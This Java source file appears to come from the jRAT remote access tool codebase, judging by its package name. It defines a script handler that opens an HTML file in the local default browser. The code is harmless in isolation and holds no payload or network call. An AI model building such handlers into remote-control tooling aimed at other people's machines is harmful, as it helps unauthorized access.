package io.jrat.common.script;

import java.awt.Desktop;
import java.io.File;
import java.net.URI;

public class HTMLScript extends AbstractScript {

	@Override
	protected void perform(File file) throws Exception {
		Desktop.getDesktop().browse(new URI("file://" + file.getAbsolutePath().replace("\\", "/")));
	}

	@Override
	public String getExtension() {
		return "html";
	}

}
